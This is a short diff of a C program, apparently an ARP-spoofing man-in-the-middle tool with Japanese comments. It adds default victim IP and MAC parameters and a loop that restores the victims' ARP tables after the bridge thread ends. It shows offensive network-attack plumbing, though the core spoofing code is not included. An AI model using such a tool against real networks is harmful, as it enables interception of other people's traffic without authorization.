@@ -207,6 +207,13 @@ void *StartMITMBridge(void *p){
 
 int main(int argc,char *argv[],char *envp[])
 {
+    //netutil.hで使うパラメータのセッティング(使いまわせるように設定方法変えたほうがいいかも)
+    if(argc == 5) setParam("enp0s3", 1, argv[1], argv[2], argv[3], argv[4]);
+ 
+    else{ 
+        DebugPrintf("Default param was set.");
+        setParam("enp0s3", 1, "192.168.1.8", "192.168.1.7", "08:00:27:d5:2a:5a", "08:00:27:8c:8a:35");
+    }
     char    buf[80];
 
     //----デバイスセッティング
@@ -350,9 +357,10 @@ int main(int argc,char *argv[],char *envp[])
     pthread_join(bridgeTid  , NULL);
 
     //victimたちのARPテーブルの修復(ARPスプーフィングのときと違い、送信元MACaddrが正しい)
-    //SendArpRequestB(arg_arpspoof.soc, arg_arpspoof.ip_d, arg_arpspoof.mac_d, arg_arpspoof.ip_s, arg_arpspoof_r.mac_d);
-    //SendArpRequestB(arg_arpspoof_r.soc, arg_arpspoof_r.ip_d, arg_arpspoof_r.mac_d, arg_arpspoof_r.ip_s, arg_arpspoof.mac_d);
-
+    for(int k=0; k<10; k++){
+    SendArpRequestB(arg_arpspoof.soc, arg_arpspoof.ip_d, arg_arpspoof.mac_d, arg_arpspoof.ip_s, arg_arpspoof_r.mac_d);
+    SendArpRequestB(arg_arpspoof_r.soc, arg_arpspoof_r.ip_d, arg_arpspoof_r.mac_d, arg_arpspoof_r.ip_s, arg_arpspoof.mac_d);
+    }
     close(Device[0].soc);
 
     return(0);
